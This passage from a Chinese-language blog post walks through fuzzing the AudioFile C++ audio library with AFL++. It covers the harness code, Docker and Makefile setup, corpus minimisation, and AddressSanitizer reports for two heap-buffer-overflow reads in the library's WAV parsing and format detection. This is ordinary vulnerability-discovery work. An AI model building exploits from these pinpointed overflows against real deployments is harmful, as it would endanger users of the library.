class="string">&quot;Running Example: Load Audio File and Print Summary&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Set a file path to an audio file on your machine</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> filePath = <span class="built_in">std</span>::<span class="built_in">string</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create an AudioFile object and load the audio file</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        <span class="keyword">bool</span> loadedOK = a.load(filePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** If you hit this assert then the file path above</span></span><br><span class="line"><span class="comment">         probably doesn&#x27;t refer to a valid audio file */</span></span><br><span class="line">        assert(loadedOK);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. Let&#x27;s print out some key details</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bit Depth: &quot;</span> &lt;&lt; a.getBitDepth() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sample Rate: &quot;</span> &lt;&lt; a.getSampleRate() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Num Channels: &quot;</span> &lt;&lt; a.getNumChannels() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Length in Seconds: &quot;</span> &lt;&lt; a.getLengthInSeconds() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadAudioFileAndProcessSamples</span><span class="params">(<span class="keyword">char</span> *file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Running Example: Load Audio File and Process Samples&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;**********************&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. Set a file path to an audio file on your machine</span></span><br><span class="line">        <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> inputFilePath = <span class="built_in">std</span>::<span class="built_in">string</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. Create an AudioFile object and load the audio file</span></span><br><span class="line">        AudioFile&lt;<span class="keyword">float</span>&gt; a;</span><br><span class="line">        <span class="keyword">bool</span> loadedOK = a.load(inputFilePath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** If you hit this assert then the file path above</span></span><br><span class="line"><span class="comment">         probably doesn&#x27;t refer to a valid audio file */</span></span><br><span class="line">        assert(loadedOK);</span><br><span class="line">        <span class="comment">// 3. Let&#x27;s apply a gain to every audio sample</span></span><br><span class="line">        <span class="keyword">float</span> gain = <span class="number">0.5f</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.getNumSamplesPerChannel(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> channel = <span class="number">0</span>; channel &lt; a.getNumChannels(); channel++)</span><br><span class="line">            &#123;</span><br><span class="line">                a.samples[channel][i] = a.samples[channel][i] * gain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// namespace examples</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我开启了AFL的Persistent Mode，开启方法是在调用函数前加上下面的代码。</p><p><code>while (__AFL_LOOP(10000)) &#123;&#125;</code></p><p>Persistent Mode消除重复 fork() 调用和相关操作系统开销的需要，因为有些函数只要简单重置状态值就可以处理不同的输入文件，这样一个进程就可以一直执行。在迭代了10000次后，AFL会重新启动进程，这最大限度地降低了内存泄漏和类似错误的影响。</p><h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><ol><li><p>首先运行docker镜像</p><p><code>docker run -ti -v /location/of/your/target:/src aflplusplus/aflplusplus</code></p><p>路径是源代码所在目录，这里需要填入绝对路径。</p></li><li><p>准备命令</p><p><code>export AFL_USE_ASAN=1</code>表示编译器开启 -fsanitize=address 进行编译</p><p><code>sudo afl-system-config</code>这会重新配置系统以获得最佳Fuzzing速度 </p></li><li><p>编译</p><p>AudioFile原本是用cmake生成Makefile进行编译，但我运行的时候编译不成功。所以改为直接编写Makefile编译，将头文件和源文件放在同一目录下。</p><p><code>make CXX=afl-clang-fast++</code></p></li></ol><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">objects :=examples.o</span><br><span class="line"></span><br><span class="line">CXX=g++</span><br><span class="line">CFLAGS+=-g</span><br><span class="line">EXE=first_try</span><br><span class="line"></span><br><span class="line"><span class="section">first_try: <span class="variable">$(objects)</span> </span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$(EXE)</span> <span class="variable">$(objects)</span> </span><br><span class="line"><span class="section">examples.o: examples.cpp AudioFile.h</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CFLAGS)</span> -c examples.cpp</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">rm <span class="variable">$(objects)</span> first_try</span><br></pre></td></tr></table></figure><h3 id="处理种子语料库"><a href="#处理种子语料库" class="headerlink" title="处理种子语料库"></a>处理种子语料库</h3><p>输入文件选择AudioFile中原有的示例音频文件。</p><p><code>afl-cmin -i in/ -o in_cmin -m none -- ./first_try @@</code></p><p>使用 afl++ 工具 afl-cmin 从语料库中删除不会在目标中生成新路径的输入。</p><p><code>@@</code>表示是文件输入，如果是标准输入去除<code>@@</code>即可。</p><h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p><code>afl-fuzz -i in_cmin/ -o out -m none -- ./first_try @@</code></p><h3 id="处理crashes"><a href="#处理crashes" class="headerlink" title="处理crashes"></a>处理crashes</h3><p>会产生crash的文件放在out/default/crashes中，编译测试crashes的程序，去除掉源代码中的AFL_LOOP</p><p><code>g++ -g -fsanitize=address -o asantry examples.cpp AudioFile.h</code> </p><img src="/images/Screenshot at 2021-06-04 14-43-56.png" alt="Screenshot at 2021-06-04 14-43-56" style="zoom: 67%;" /><p>之后逐个输入crash，查看结果。</p><ol><li><p>第一个heap buff overflowin位于AudioFile.h:502，decodeWaveFile()函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./asantry ./out/default/crashes/id\:000005\,sig\:06\,src\:000006\,time\:84641\,op\:havoc\,rep\:2</span><br></pre></td></tr></table></figure><p>asan结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">**********************</span><br><span class="line">Running Example: Load Audio File and Print Summary</span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">=================================================================</span><br><span class="line">==23==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000738 at pc 0x55da0cb245e9 bp 0x7ffc6e244e90 sp 0x7ffc6e244e80</span><br><span class="line">READ of size 1 at 0x602000000738 thread T0</span><br><span class="line">    #0 0x55da0cb245e8 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:379</span><br><span class="line">    #1 0x55da0cb226a7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::forward_iterator_tag) /usr/include/c++/10/bits/basic_string.tcc:225</span><br><span class="line">    #2 0x55da0cb1fba7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct_aux&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::__false_type) /usr/include/c++/10/bits/basic_string.h:247</span><br><span class="line">    #3 0x55da0cb1cfd5 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:266</span><br><span class="line">    #4 0x55da0cb19e45 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, void&gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::allocator&lt;char&gt; const&amp;) /usr/include/c++/10/bits/basic_string.h:628</span><br><span class="line">    #5 0x55da0cb11fcd in AudioFile&lt;float&gt;::decodeWaveFile(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;) /src/AudioFile.h:502</span><br><span class="line">    #6 0x55da0cb0d359 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:481</span><br><span class="line">    #7 0x55da0cb0554d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x55da0cb04d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7fede8fdb0b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line">    #10 0x55da0cb04c0d in _start (/src/asantry+0x4c0d)</span><br><span class="line"></span><br><span class="line">0x602000000738 is located 2 bytes to the right of 6-byte region [0x602000000730,0x602000000736)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x7fede95a2f17 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.6+0xb1f17)</span><br><span class="line">    #1 0x55da0cb1da08 in __gnu_cxx::new_allocator&lt;unsigned char&gt;::allocate(unsigned long, void const*) /usr/include/c++/10/ext/new_allocator.h:115</span><br><span class="line">    #2 0x55da0cb1ac79 in std::allocator_traits&lt;std::allocator&lt;unsigned char&gt; &gt;::allocate(std::allocator&lt;unsigned char&gt;&amp;, unsigned long) /usr/include/c++/10/bits/alloc_traits.h:460</span><br><span class="line">    #3 0x55da0cb16819 in std::_Vector_base&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_allocate(unsigned long) /usr/include/c++/10/bits/stl_vector.h:346</span><br><span class="line">    #4 0x55da0cb195b6 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_default_append(unsigned long) /usr/include/c++/10/bits/vector.tcc:635</span><br><span class="line">    #5 0x55da0cb11896 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::resize(unsigned long) /usr/include/c++/10/bits/stl_vector.h:940</span><br><span class="line">    #6 0x55da0cb0d192 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:465</span><br><span class="line">    #7 0x55da0cb0554d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x55da0cb04d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7fede8fdb0b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/c++/10/bits/basic_string.h:379 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c047fff8090: fa fa fd fd fa fa fd fd fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80a0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80b0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80c0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80d0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">=&gt;0x0c047fff80e0: fa fa 00 02 fa fa 06[fa]fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==23==ABORTING</span><br></pre></td></tr></table></figure></li><li><p>第二个heap buff overflowin位于AudioFile.h:1148，determineAudioFileFormat()函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./asantry ./out/default/crashes/id\:000000\,sig\:06\,src\:000006\,time\:291\,op\:havoc\,rep\:16</span><br></pre></td></tr></table></figure><p>asan结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">**********************</span><br><span class="line">Running Example: Load Audio File and Print Summary</span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">=================================================================</span><br><span class="line">==13==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000731 at pc 0x561c434c55e9 bp 0x7ffeb0ea5a50 sp 0x7ffeb0ea5a40</span><br><span class="line">READ of size 1 at 0x602000000731 thread T0</span><br><span class="line">    #0 0x561c434c55e8 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:379</span><br><span class="line">    #1 0x561c434c36a7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::forward_iterator_tag) /usr/include/c++/10/bits/basic_string.tcc:225</span><br><span class="line">    #2 0x561c434c0ba7 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct_aux&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::__false_type) /usr/include/c++/10/bits/basic_string.h:247</span><br><span class="line">    #3 0x561c434bdfd5 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_construct&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;) /usr/include/c++/10/bits/basic_string.h:266</span><br><span class="line">    #4 0x561c434bae45 in std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, void&gt;(__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, std::allocator&lt;char&gt; const&amp;) /usr/include/c++/10/bits/basic_string.h:628</span><br><span class="line">    #5 0x561c434b2a75 in AudioFile&lt;float&gt;::determineAudioFileFormat(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;) /src/AudioFile.h:1148</span><br><span class="line">    #6 0x561c434ae2ee in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:477</span><br><span class="line">    #7 0x561c434a654d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x561c434a5d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7f99260b30b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line">    #10 0x561c434a5c0d in _start (/src/asantry+0x4c0d)</span><br><span class="line"></span><br><span class="line">0x602000000731 is located 0 bytes to the right of 1-byte region [0x602000000730,0x602000000731)</span><br><span class="line">allocated by thread T0 here:</span><br><span class="line">    #0 0x7f992667af17 in operator new(unsigned long) (/lib/x86_64-linux-gnu/libasan.so.6+0xb1f17)</span><br><span class="line">    #1 0x561c434bea08 in __gnu_cxx::new_allocator&lt;unsigned char&gt;::allocate(unsigned long, void const*) /usr/include/c++/10/ext/new_allocator.h:115</span><br><span class="line">    #2 0x561c434bbc79 in std::allocator_traits&lt;std::allocator&lt;unsigned char&gt; &gt;::allocate(std::allocator&lt;unsigned char&gt;&amp;, unsigned long) /usr/include/c++/10/bits/alloc_traits.h:460</span><br><span class="line">    #3 0x561c434b7819 in std::_Vector_base&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_allocate(unsigned long) /usr/include/c++/10/bits/stl_vector.h:346</span><br><span class="line">    #4 0x561c434ba5b6 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::_M_default_append(unsigned long) /usr/include/c++/10/bits/vector.tcc:635</span><br><span class="line">    #5 0x561c434b2896 in std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;::resize(unsigned long) /usr/include/c++/10/bits/stl_vector.h:940</span><br><span class="line">    #6 0x561c434ae192 in AudioFile&lt;float&gt;::load(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;) /src/AudioFile.h:465</span><br><span class="line">    #7 0x561c434a654d in examples::loadAudioFileAndPrintSummary(char*) /src/examples.cpp:95</span><br><span class="line">    #8 0x561c434a5d0e in main /src/examples.cpp:26</span><br><span class="line">    #9 0x7f99260b30b2 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x270b2)</span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/c++/10/bits/basic_string.h:379 in void std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_S_copy_chars&lt;__gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt; &gt;(char*, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;, __gnu_cxx::__normal_iterator&lt;unsigned char*, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt; &gt;)</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  0x0c047fff8090: fa fa fd fd fa fa fd fd fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80a0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80b0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80c0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">  0x0c047fff80d0: fa fa 00 02 fa fa 00 02 fa fa 00 02 fa fa 00 02</span><br><span class="line">=&gt;0x0c047fff80e0: fa fa 00 02 fa fa[01]fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  0x0c047fff8130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents 8 application bytes):</span><br><span class="line">  Addressable:           00</span><br><span class="line">  Partially addressable: 01 02 03 04 05 06 07 </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after return:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       